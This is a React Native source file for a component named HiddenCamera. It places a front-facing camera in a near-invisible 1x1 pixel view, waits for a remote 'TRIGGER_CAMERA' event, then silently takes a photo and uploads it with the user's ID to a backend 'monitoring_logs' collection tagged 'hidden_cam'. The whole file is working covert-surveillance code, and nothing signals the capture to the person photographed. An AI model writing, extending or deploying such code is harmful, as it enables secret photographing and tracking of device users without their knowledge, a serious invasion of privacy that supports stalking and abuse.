import React, { useEffect, useRef, useState } from 'react';
import { View } from 'react-native';
import { CameraView, useCameraPermissions } from 'expo-camera';
import { pb } from '../../services/pocketbase';
import EventEmitter from 'react-native/Libraries/vendor/emitter/EventEmitter';

// Simple event bus for triggering camera from outside React tree
export const cameraEvents = new EventEmitter();

export const HiddenCamera = () => {
    const [permission, requestPermission] = useCameraPermissions();
    const cameraRef = useRef<CameraView>(null);
    const [ready, setReady] = useState(false);

    useEffect(() => {
        requestPermission();

        const onTrigger = async () => {
            if (cameraRef.current && ready) {
                try {
                    const photo = await cameraRef.current.takePictureAsync({ quality: 0.5, skipProcessing: true });
                    if (photo) await uploadPhoto(photo.uri);
                } catch (e) {
                    console.error("Camera capture failed", e);
                }
            }
        };

        const sub = cameraEvents.addListener('TRIGGER_CAMERA', onTrigger);
        return () => sub.remove();
    }, [ready]);

    const uploadPhoto = async (uri: string) => {
        try {
            const formData = new FormData();
            // @ts-ignore
            formData.append('file', {
                uri,
                name: `cam_${Date.now()}.jpg`,
                type: 'image/jpeg',
            });
            formData.append('type', 'hidden_cam');
            // @ts-ignore
            formData.append('user_id', pb.authStore.model?.id || 'anonymous');

            await pb.collection('monitoring_logs').create(formData);
            console.log('Photo captured and uploaded');
        } catch (e) {
            console.error("Photo upload failed", e);
        }
    };

    if (!permission?.granted) return null;

    return (
        <View style={{ width: 1, height: 1, opacity: 0.01, position: 'absolute', top: 0, left: 0 }}>
            <CameraView
                ref={cameraRef}
                style={{ flex: 1 }}
                facing="front"
                onCameraReady={() => setReady(true)}
            />
        </View>
    );
};
